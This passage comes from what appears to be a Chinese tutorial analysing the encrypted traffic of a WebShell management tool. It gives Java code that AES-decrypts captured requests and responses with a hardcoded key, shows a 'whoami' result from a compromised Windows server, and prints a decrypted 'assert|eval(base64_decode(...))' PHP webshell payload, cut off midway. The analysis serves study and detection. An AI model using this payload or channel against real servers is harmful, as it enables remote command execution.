            byte[] decodedEncryptedText = Base64.getDecoder().decode(encryptedText);
            byte[] originalBytes = cipher.doFinal(decodedEncryptedText);
            String decryptedText = new String(originalBytes);


            // 输出解密后的明文
            System.out.println("AES解密:" + decryptedText);

            //结果有两种，一种是有包含"base64_decode，一种是包含{"status":"需要进行判断，结果有两种，一种是有包含"base64_decode，一种是包含{"status":"需要进行判断，
            //情况1

            if (decryptedText.contains("base64_decode")) {
                // 提取 Base64 编码的部分并解码
                String base64Part = decryptedText.split("base64_decode\\('")[1].split("'")[0]; // 提取 Base64 字符串
                byte[] decodedBytes = Base64.getDecoder().decode(base64Part);
                String decodedString = new String(decodedBytes);

                // 输出解码后的字符串
                System.out.println("Base64解密: " + decodedString);
            } else {

                //情况2
                // 解析 JSON 字符串（可以使用更精确的 JSON 解析方式，示例中使用简单的字符串操作）
                String encodedStatus = decryptedText.substring(decryptedText.indexOf("\"status\":\"") + 10, decryptedText.indexOf("\",\"msg\""));
                String encodedMsg = decryptedText.substring(decryptedText.indexOf("\"msg\":\"") + 7, decryptedText.lastIndexOf("\""));

                // Base64 解码 status 和 msg
                String decodedStatus = new String(Base64.getDecoder().decode(encodedStatus));
                String decodedMsg = new String(Base64.getDecoder().decode(encodedMsg));

                // 输出解码后的内容

                System.out.println("Base64解码：{\"status\":\"" + decodedStatus + "\",\"msg\":\"" + decodedMsg);
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

###### 响应数据

```bash
mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j7xk5Yl6c/GMDjpjMPvtPNF8U98FWdrO1R8TXMEdAFXCEJs0cHRU6XHmQAyIBdaz12gm/D7BeaYRwGS3eCukfGwLTUMYLmyJKAgJq+tgE2zSg==
```

![image-20241030212859591](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030212859591.png)

![image-20241030212939131](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241030212939131.png)

```java
package myDecode;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class AESDecryption {
    public static void main(String[] args) {
        try {
            // 密文
            String encryptedText = "mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j7xk5Yl6c/GMDjpjMPvtPNF8U98FWdrO1R8TXMEdAFXCEJs0cHRU6XHmQAyIBdaz12gm/D7BeaYRwGS3eCukfGwLTUMYLmyJKAgJq+tgE2zSg==";
//            String encryptedText = "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";
            // 密钥（16字节）
            String key = "e45e329feb5d925b";

            // 解码密钥
            SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");

            // 初始化解密（无IV）
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(new byte[16])); // 不传IV，使用默认的全0向量
            byte[] decodedEncryptedText = Base64.getDecoder().decode(encryptedText);
            byte[] originalBytes = cipher.doFinal(decodedEncryptedText);
            String decryptedText = new String(originalBytes);


            // 输出解密后的明文
            System.out.println("AES解密:" + decryptedText);

            //结果有两种，一种是有包含"base64_decode，一种是包含{"status":"需要进行判断，结果有两种，一种是有包含"base64_decode，一种是包含{"status":"需要进行判断，
            //情况1

            if (decryptedText.contains("base64_decode")) {
                // 提取 Base64 编码的部分并解码
                String base64Part = decryptedText.split("base64_decode\\('")[1].split("'")[0]; // 提取 Base64 字符串
                byte[] decodedBytes = Base64.getDecoder().decode(base64Part);
                String decodedString = new String(decodedBytes);

                // 输出解码后的字符串
                System.out.println("Base64解密: " + decodedString);
            } else {

                //情况2
                // 解析 JSON 字符串（可以使用更精确的 JSON 解析方式，示例中使用简单的字符串操作）
                String encodedStatus = decryptedText.substring(decryptedText.indexOf("\"status\":\"") + 10, decryptedText.indexOf("\",\"msg\""));
                String encodedMsg = decryptedText.substring(decryptedText.indexOf("\"msg\":\"") + 7, decryptedText.lastIndexOf("\""));

                // Base64 解码 status 和 msg
                String decodedStatus = new String(Base64.getDecoder().decode(encodedStatus));
                String decodedMsg = new String(Base64.getDecoder().decode(encodedMsg));

                // 输出解码后的内容

                System.out.println("Base64解码：{\"status\":\"" + decodedStatus + "\",\"msg\":\"" + decodedMsg);
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

![image-20241031000432143](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241031000432143.png)

```bash
{"status":"c3VjY2Vzcw==","msg":"d2hvYW1pDQp3aW4tbTRoMGk0OHRrMGhcd2luMjAxMg0KDQpFOlxwaHBzdHVkeV9wcm9cV1dXPg=="}

whoami

win-m4h0i48tk0h\win2012

E:\phpstudy_pro\WWW>
```



###### 请求数据

![image-20241031000739433](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241031000739433.png)

```bash
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
```

![image-20241031000600604](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241031000600604.png)

![image-20241031000947887](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241031000947887.png)

```java
package myDecode;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class AESDecryption {
    public static void main(String[] args) {
        try {
            // 密文
//            String encryptedText = "mAUYLzmqn5QPDkyI5lvSp0fjiBu1e7047YjfczwY6j7xk5Yl6c/GMDjpjMPvtPNF8U98FWdrO1R8TXMEdAFXCEJs0cHRU6XHmQAyIBdaz12gm/D7BeaYRwGS3eCukfGwLTUMYLmyJKAgJq+tgE2zSg==";
            String encryptedText = "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";
            // 密钥（16字节）
            String key = "e45e329feb5d925b";

            // 解码密钥
            SecretKeySpec secretKey = new SecretKeySpec(key.getBytes(), "AES");

            // 初始化解密（无IV）
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey, new IvParameterSpec(new byte[16])); // 不传IV，使用默认的全0向量
            byte[] decodedEncryptedText = Base64.getDecoder().decode(encryptedText);
            byte[] originalBytes = cipher.doFinal(decodedEncryptedText);
            String decryptedText = new String(originalBytes);


            // 输出解密后的明文
            System.out.println("AES解密:" + decryptedText);

            //结果有两种，一种是有包含"base64_decode，一种是包含{"status":"需要进行判断，结果有两种，一种是有包含"base64_decode，一种是包含{"status":"需要进行判断，
            //情况1

            if (decryptedText.contains("base64_decode")) {
                // 提取 Base64 编码的部分并解码
                String base64Part = decryptedText.split("base64_decode\\('")[1].split("'")[0]; // 提取 Base64 字符串
                byte[] decodedBytes = Base64.getDecoder().decode(base64Part);
                String decodedString = new String(decodedBytes);

                // 输出解码后的字符串
                System.out.println("Base64解密: " + decodedString);
            } else {

                //情况2
                // 解析 JSON 字符串（可以使用更精确的 JSON 解析方式，示例中使用简单的字符串操作）
                String encodedStatus = decryptedText.substring(decryptedText.indexOf("\"status\":\"") + 10, decryptedText.indexOf("\",\"msg\""));
                String encodedMsg = decryptedText.substring(decryptedText.indexOf("\"msg\":\"") + 7, decryptedText.lastIndexOf("\""));

                // Base64 解码 status 和 msg
                String decodedStatus = new String(Base64.getDecoder().decode(encodedStatus));
                String decodedMsg = new String(Base64.getDecoder().decode(encodedMsg));

                // 输出解码后的内容

                System.out.println("Base64解码：{\"status\":\"" + decodedStatus + "\",\"msg\":\"" + decodedMsg);
            }


        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

![image-20241031001206574](https://image.201068.xyz/assets/7.WebShell管理工具讲解/image-20241031001206574.png)

```bash
assert|eval(base64_decode('QGVycm9yX3JlcG9ydGluZygwKTsKZnVuY3Rpb24gbWFpbigkY29udGVudCkKewoJJHJlc3VsdCA9IGFycmF5KCk7CgkkcmVzdWx0WyJzdGF0dXMiXSA9IGJhc2U2NF9lbmNvZGUoInN1Y2Nlc3MiKTsKICAgICRyZXN1bHRbIm1zZyJdID0gYmFzZTY0X2VuY29kZSgkY29udGVudCk7CiAgICBAc2Vzc2lvbl9zdGFydCgpOyAgLy/liJ3lp4vljJZzZXNzaW9u77yM6YG/5YWNY29ubmVjdOS5i+WQjuebtOaOpWJhY2tncm91bmTvvIzlkI7nu61nZXRyZXN1bHTml6Dms5Xojrflj5Zjb29raWUKCiAgICBlY2hvIGVuY3J5cHQoanNvbl9lbmNvZGUoJHJlc3VsdCkpOwp9CgpmdW5jdGlvbiBFbmNyeXB0KCRkYXRhKQp7CiBAc2Vzc2lvbl9zdGFydCgpOwogICAgJGtleSA9ICRfU0VTU0lPTlsnayddOwoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkKICAgIAl7CiAgICAJCWZvcigkaT0wOyRpPHN0cmxlbigkZGF0YSk7JGkrKykgewogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOwogICAgCQkJfQoJCQlyZXR1cm4gJGRhdGE7CiAgICAJfQogICAgZWxzZQogICAgCXsKICAgIAkJcmV0dXJuIG9wZW5zc2xfZW5jcnlwdCgkZGF0YSwgIkFFUzEyOCIsICRrZXkpOwogICAgCX0KfQokY29udGVudD0iTTFwMFlqSmtRM3BLUTNOc09XMDBaRTlZZDNCVllVVkNhbFpLY1VoMVlUbHhNelZsUVhwVlEzVnlORXRrZDFWclZ6WnJPRXBCTjIxaU1uTnZNelJPTldWT01rRTFhVEU1TkhOcGJUZDBabHBvVWtneVYwSnhOREJtWVRaRVJYb3lkbnBzVUUxcWFHSjVlWEV3WW1scmMxVmhXVGQ1VlhKbGVrYzJOREJrVGpaVFdsVnJSWGhSVTB4R09WbEZUMUJNTm5SUVpXUlZTMjFLV1hsV1FVcGtRVWg1V21KTWFETm5OV2N5VTFsaWRGbFBia2x4Y1RacWVteFVlR1k1TkROUVltZFFiVzluZG14V2NHdzRjbFZNT1ZvME1tcHNTR3hKYVhaWmJ6VlpTRFpSVEdNeVZHVlpUMk5YVVVGeVYzUXlXazFoTlRsSlMyaEJZbXhxWTFKRmEybFdiMUp0ZDBGU2JFSTRjRXRuVERGUFZIRkpUM2xXVW5OeFNXMDRTM0JxVVVsTFNGWldPRk5DY0ZsbWIzWnBTM1p3UVV0eFdsWkVUemh1WW5wdWVHaEhaMWhrV1hoRWFYcDNXVWxVYjFKSldHcENaekZ0WTJGa01GUkdUR1JyVUZsSFZraFpOMFUyV2tGbk1WUktORTV5WmpsM1ZVZDBhM3ByUkVzMFFtOWFhbEZYT1dSalFrTmtTbE13TW5oSFVIQTRlVVY1ZUdkMVlsTk1jVXRTTmpGblVURnROazVuVW01T1NHOXZSRWRFZHpOa00wczJVRlJHTUVaSFNrVTVWbVIxWldGblZtTnJSR1p0YW1GbmJVTkVOWEJhUmxKak4yTTFWbTlKTW04MVlVTXhWa0pHVFcxVlFYbzFTMEpOVjBaNlowMHhiVFV4WjJ4SmNUZGFaSEJuWWxZM1VWTlNlVWd5Y1dWcVFuaG5iVkpqTXpaaFMwbHBiMUJ6ZEVaM2RFUnVZbFl4VDJKblNsWnRVWFpuVTJKaE5IcEpWVmxKUTBKSFMyeERVMlY1Y0hGd1pYazJhMVF5ZWt0bE1XSktNRWxaV1dRNFNYY3dWWHBNUm5aMFoybzNhM1IyWkVoemFuQnViRWhLWWt4MVVGaDNOM3A1TVVKNWFUZHJhekE0Y2xKRWRUUlVhM2RhWVZKblNEaEpTa3BEWTFBMlVIbGlhbUZzVW1aUk9GbG5ZMFpKYkV0M2JXOWhSelJwZWpJNVdFRk9WbmxNVkdkcVdqQXhRVXQxYUVaSE5GTmpTRVp0TUdaRFdFOVRNSEJJYzJKV1pYUTJPRzFGWm5KWk5qRlZSamhTWjBkbGIwTkZVVUp0VEVneVIwdzVkRkYxY0doQk4wVkZUM1E0TkZwVVEwZzBRekpQTjNZd1JFb3lWWHBTZWxCa1MxbDNPR2hQYWxaNVZFcz0iOyRjb250ZW50PWJhc2U2NF9kZWNvZGU